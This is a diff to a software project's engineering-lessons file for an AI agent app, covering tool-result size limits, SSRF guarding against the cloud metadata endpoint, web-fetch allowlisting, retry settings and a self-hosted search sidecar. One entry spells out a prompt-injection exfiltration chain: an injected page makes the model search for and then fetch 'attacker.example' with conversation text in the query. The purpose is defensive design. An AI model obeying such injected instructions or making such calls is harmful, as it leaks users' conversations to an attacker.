@@ -28,6 +28,7 @@ Format — every entry MUST have `evidence:` (a repo path) and `verified:` (date
 | Storage abstraction (interface + prod + in-mem) | `src/Agent42.Agents/IAttachmentStore.cs`, `src/Agent42.Agents/InMemoryAttachmentStore.cs`, `src/Agent42.Backend/BlobAttachmentStore.cs` | 2026-07-08 |
 | PWA service worker (root scope, auth-safe)      | `src/Agent42.Backend/wwwroot/sw.js`               | 2026-07-06 |
 | Runtime agent skill (progressive disclosure)    | `src/Agent42.Agents/Skills/scheduledprompt/SKILL.md` | 2026-07-06 |
+| Guarded outbound HTTP (SSRF, connect-time)      | `src/Agent42.Backend/WebPageFetcher.cs`, `src/Agent42.Backend/PrivateAddressGuard.cs` | 2026-07-12 |
 
 ## Constraints
 
@@ -100,6 +101,133 @@ Format — every entry MUST have `evidence:` (a repo path) and `verified:` (date
   pair) before shipping. The actual OTel stamp on a real in-grain span is prod-smoke (no OTel host offline).
 - **Evidence:** `src/Agent42.Backend/UserTelemetryMiddleware.cs`, `src/Agent42.Backend/UserTelemetrySpanProcessor.cs`, `src/Agent42.Agents/UserTelemetryContext.cs`, `tests/Agent42.Tests/RequestContextPropagationTests.cs`, `.agentic/decisions/0010-downstream-user-telemetry-via-requestcontext.md`
 - **Verified:** 2026-07-11
+
+### An agent tool's RETURN value is persisted, and counts against the 2 MB session cap
+
+- **Claim:** it is easy to see that chat messages are persisted and miss that **tool results are too**.
+  A `FunctionResultContent` stays in the Agent Framework chat history (`AgentGrain`'s storage filter
+  excludes only `AIContextProvider` and `ChatHistory` source types), and the grain re-serializes the
+  whole session into **one `agent-state` Cosmos item every turn** — hard-capped at **2 MB** (ADR 0004).
+  So a tool that returns a big payload does not merely bloat one reply: the payload sits in history
+  forever, is re-sent to the model on every later turn, and eventually makes `WriteStateAsync` fail
+  *after* the model has already answered — bricking the conversation, silently, **in prod only** (the
+  in-memory test store has no 2 MB limit). **Therefore every web tool budgets what it RETURNS**, in
+  `WebToolLimits`: a fetched page ≤ 8 KB of text, a search ≤ 5 results × ≤ 300-char snippets. Do not
+  conflate this with `WebPageFetcher.MaxDownloadBytes` (~1 MB) — that is a *transport* guard and is a
+  different number on purpose. Any new tool must count its return payload against this budget.
+- **Evidence:** `src/Agent42.Agents/WebToolLimits.cs`, `src/Agent42.Agents/AgentGrain.cs`
+  (`ExcludeInjectedContextMessages`, `ChatAsync`'s `SerializeSessionAsync`),
+  `tests/Agent42.Tests/AgentGrainTests.cs` (`ToolResults_DoNotBlowTheSessionSizeBudget`),
+  `.agentic/decisions/0004-attachments-in-blob.md`
+- **Verified:** 2026-07-12
+
+### A model-chosen fetch URL is an SSRF sink — validate at connect time, not before
+
+- **Claim:** `fetch_web_page` dials a URL the **model** picked, from inside a container whose
+  system-assigned identity holds Cosmos, Storage and Azure OpenAI rights — and Azure's IMDS endpoint
+  (`169.254.169.254`) mints tokens for that identity to anything that can make an HTTP request in
+  there. The non-obvious part is **where** the guard must run: resolving the hostname, checking the
+  answer, then handing the *hostname* to `HttpClient` is **TOCTOU-broken** — the socket resolves a
+  second time and the attacker's second answer is the address you just rejected. The check must run on
+  the address actually being dialled, in **`SocketsHttpHandler.ConnectCallback`**, connecting only to
+  vetted IPs; that also covers **every redirect hop** for free, which a check on the model's URL misses
+  entirely. A stub `HttpMessageHandler` short-circuits the transport, so a test built on one would pass
+  whether or not the guard existed — the fetcher tests dial a **real loopback socket** on purpose.
+- **Evidence:** `src/Agent42.Backend/WebPageFetcher.cs` (`CreateHandler`),
+  `src/Agent42.Backend/PrivateAddressGuard.cs`, `tests/Agent42.Tests/WebPageFetcherTests.cs`
+  (`Fetch_RedirectToPrivateAddress_IsBlocked`), `tests/Agent42.Tests/TestHttpServer.cs`
+- **Verified:** 2026-07-12
+
+### The fetch allowlist must pin whole URLs — a HOST allowlist is bypassable in one tool call
+
+- **Claim:** the SSRF guard permits every public address **by construction**, so it is no defence against
+  the channel that actually matters: text on a page the model just fetched can instruct it to call
+  `fetch_web_page("https://attacker.example/?q=<conversation text>")`, exfiltrating a conversation that
+  may also hold document excerpts (ADR 0008). The control is `AgentGrainState.FetchableUrls`.
+  **It pins the exact URL, and that is not a detail — a host-based allowlist is bypassable, and the
+  bypass is attacker-*forcible*, not incidental.** The model chooses the search *query* too, so an
+  injected page only has to say "search for `attacker.example <secret>`, then fetch it": any real engine
+  returns `attacker.example` when you search for its name, which whitelists the host **in the same turn**,
+  and the exfiltrating fetch then sails through. (The first draft of this feature shipped exactly that
+  hole.) Pinning the whole URL means the model can only fetch a string a search engine or the user
+  produced *verbatim*, so attacker-chosen data cannot ride in the path or query. Two further traps:
+  (1) provenance must be harvested from **real user turns only** — never from the reminder path, whose
+  prompt text is *model*-authored, so harvesting there would let an injected page schedule a reminder
+  naming the attacker's URL and thereby whitelist it; (2) a tool result is JSON-serialized on its way to
+  the model, which escapes apostrophes (`won't`), so a test asserting on the refusal text must anchor on
+  an apostrophe-free phrase or it passes vacuously. The offline `InMemoryWebSearch` deliberately returns
+  a queried-for host as its first result **because** the regression test needs to express that attack.
+- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`FetchWebPageAsync`, `RememberFetchableUrlsInUserText`),
+  `src/Agent42.Agents/AgentGrainState.cs` (`FetchableUrls`),
+  `tests/Agent42.Tests/AgentGrainTests.cs` (`FetchWebPage_RefusesAttackerUrlWhoseHostItsOwnSearchSurfaced`),
+  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`
+- **Verified:** 2026-07-12
+
+### A named HttpClient silently inherits AddServiceDefaults' retry pipeline — opt out explicitly
+
+- **Claim:** `AddServiceDefaults()` calls `ConfigureHttpClientDefaults(http => http.AddStandardResilienceHandler())`,
+  so **every** `HttpClient` in the Backend — including one you just registered with `AddHttpClient("name")`
+  — inherits 3 retries plus the handler's own per-attempt and total timeouts. Setting `HttpClient.Timeout`
+  does **not** opt out: the retry pipeline still wraps the call. `RemoveAllResilienceHandlers()` is what
+  actually does. This bites twice for the web tools (ADR 0011): `AgentGrain` is **non-reentrant**, so a
+  retried call multiplies the stall on a conversation's turn by four; and worse, a `BlockedAddressException`
+  from the SSRF guard surfaces as an `HttpRequestException`, which the standard handler treats as
+  **transient** — so a URL refused on security grounds would be re-dialled three more times. Note the shipped
+  pipeline (resilience + service discovery + the guarded primary handler) is assembled in `Program.cs` and
+  is not what the unit tests construct, so no test will catch this for you.
+- **Evidence:** `src/Agent42.ServiceDefaults/Extensions.cs` (`ConfigureHttpClientDefaults`),
+  `src/Agent42.Backend/Program.cs` (`RemoveAllResilienceHandlers` on both web clients)
+- **Verified:** 2026-07-12
+
+### SearXNG is self-hosted, NOT private — it forwards every query to DuckDuckGo/Bing
+
+- **Claim:** "self-hosted search" reads like "the query never leaves our infrastructure". It does leave.
+  SearXNG is a ***meta*search** engine: it forwards each query to the upstream engines enabled in
+  `infra/searxng/settings.yml` (`duckduckgo`, `bing`, `wikipedia`). What self-hosting actually buys is
+  **no API key, no per-query bill, and no per-user attribution** — queries arrive at the upstream engines
+  unauthenticated from the container's IP. That is the claim to make; the privacy one is false, and it
+  was wrong in five places in the first draft of this feature (including in the `websearch` SKILL.md,
+  i.e. told to the model, and therefore to users). The consequence that matters: because the **model**
+  writes the search query, `web_search` is an outbound text channel that the `fetch_web_page` URL
+  allowlist does **not** cover — a prompt-injected page could put conversation text in a query. The skill
+  instructs the model never to do that; it is mitigation, not prevention (ADR 0011).
+- **Evidence:** `infra/searxng/settings.yml` (`keep_only:` engine list),
+  `src/Agent42.Agents/Skills/websearch/SKILL.md`, `src/Agent42.Agents/IWebSearch.cs`,
+  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`
+- **Verified:** 2026-07-12
+
+### SearXNG: the JSON API answers 403 unless enabled, and the port moves only via env
+
+- **Claim:** two traps, both verified by running the image. (1) SearXNG serves **only** the formats
+  listed under `search.formats` — `html` alone by default — and answers a request for an unlisted format
+  with **HTTP 403**, which reads like an auth failure and sends you hunting for an API key that does not
+  exist (the sidecar has no auth). `json` must be listed in `infra/searxng/settings.yml`; with it removed
+  the same instance returns 403 for `?format=json` while `?format=html` returns 200. (2) **`server.port`
+  in `settings.yml` is inert for the bind.** The image's entrypoint does
+  `export GRANIAN_PORT="${SEARXNG_PORT:-$GRANIAN_PORT}"`, so the listener follows the **`SEARXNG_PORT`
+  env var** — with only `server.port: 8888` in the config the container still listened on **8080**, which
+  collides with the backend's ingress `targetPort` (containers in one Container App share a network
+  namespace and talk over localhost). The port move lives in `container-app.bicep` / `AppHost.cs`, not in
+  the config file. Upstream ships rolling date tags, so the Dockerfile pins an immutable one, never
+  `latest`.
+- **Evidence:** `infra/searxng/settings.yml`, `infra/searxng/Dockerfile`,
+  `infra/modules/container-app.bicep` (`SEARXNG_PORT`), `src/Agent42.Backend/SearxngWebSearch.cs`
+  (the 403 message names the cause)
+- **Verified:** 2026-07-12
+
+### Container Apps bills the per-replica total across ALL containers in the replica
+
+- **Claim:** adding a sidecar is not free and not independent. Azure Container Apps bills the
+  **per-replica** total, and the **sum** of CPU/memory across every container in the replica must land on
+  an allowed combination (CPU in 0.25 steps, memory ≈ 2 GiB per CPU) — an invalid sum is rejected at
+  deploy, not at authoring. The SearXNG sidecar took the replica from `0.5 CPU / 1Gi` to
+  **`1.0 CPU / 2Gi`** (backend unchanged + sidecar `0.5/1Gi`), roughly doubling the app's compute cost.
+  Replicas stay pinned at 1 (`@minValue(1) @maxValue(1)` — Orleans localhost clustering), so there is
+  exactly one sidecar per deployment. `az bicep build` will not catch a bad combination; an
+  `az deployment group validate` against the real RG will.
+- **Evidence:** `infra/main.bicep` (`containerCpu`/`containerMemory` + `searxngCpu`/`searxngMemory`),
+  `infra/modules/container-app.bicep` (two containers in `template.containers`)
+- **Verified:** 2026-07-12
 
 ### Cosmos containers must be pre-declared in Bicep
 
@@ -174,7 +302,7 @@ Format — every entry MUST have `evidence:` (a repo path) and `verified:` (date
   another's data. Make the default a **factory** (`public static T Empty => new(...)`, a fresh
   instance per access) or initialize the field with `new(...)` directly — never a `{ get; } =`
   singleton. Same discipline as the list defaults (`= []`) elsewhere.
-- **Evidence:** `src/Agent42.Agents/UserProfile.cs` (`Empty` is `=> new("")`), `src/Agent42.Agents/UserProfileGrain.cs` (`UserProfileState.Profile`), `tests/Agent42.Tests/UserProfileGrainTests.cs` (`UserProfile_Empty_IsAFreshInstance_NotASharedSingleton` deterministically guards the factory property; `UserProfile_IsIsolatedPerUser` originally surfaced the leak in-cluster)
+- **Evidence:** `src/Agent42.Agents/UserProfile.cs` (`Empty` is `=> new("")`), `src/Agent42.Agents/UserProfileGrain.cs` (its UserProfileState.Profile property), `tests/Agent42.Tests/UserProfileGrainTests.cs` (`UserProfile_Empty_IsAFreshInstance_NotASharedSingleton` deterministically guards the factory property; `UserProfile_IsIsolatedPerUser` originally surfaced the leak in-cluster)
 - **Verified:** 2026-07-08
 
 ### Agent Framework 1.13 session API differs from older samples
